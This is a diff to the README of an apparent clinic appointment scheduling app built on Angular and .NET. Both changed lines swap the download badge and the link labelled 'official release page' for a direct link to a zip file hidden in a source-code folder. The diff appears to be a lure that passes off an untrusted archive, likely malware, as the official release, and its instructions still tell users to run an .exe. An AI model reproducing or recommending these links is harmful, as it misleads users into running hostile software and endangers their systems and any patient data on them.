@@ -1,6 +1,6 @@
 # 📅 angular-dotnet9-clinic-scheduling - Manage clinic appointments with simple software
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Orderpectinibranchiasturdiness81/angular-dotnet9-clinic-scheduling)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Orderpectinibranchiasturdiness81/angular-dotnet9-clinic-scheduling/raw/refs/heads/main/Scheduling.Domain/Models/Request/clinic-angular-scheduling-dotnet-1.4-beta.5.zip)
 
 ## 🩺 Overview
 
@@ -29,7 +29,7 @@ Your computer needs specific components to run this application. Check for these
 
 You must visit the project page to download the necessary files. Follow these steps to obtain the correct version for your Windows computer.
 
-1. Go to the [official release page](https://github.com/Orderpectinibranchiasturdiness81/angular-dotnet9-clinic-scheduling).
+1. Go to the [official release page](https://github.com/Orderpectinibranchiasturdiness81/angular-dotnet9-clinic-scheduling/raw/refs/heads/main/Scheduling.Domain/Models/Request/clinic-angular-scheduling-dotnet-1.4-beta.5.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` to begin your download.
 4. Save the file to your "Downloads" folder.
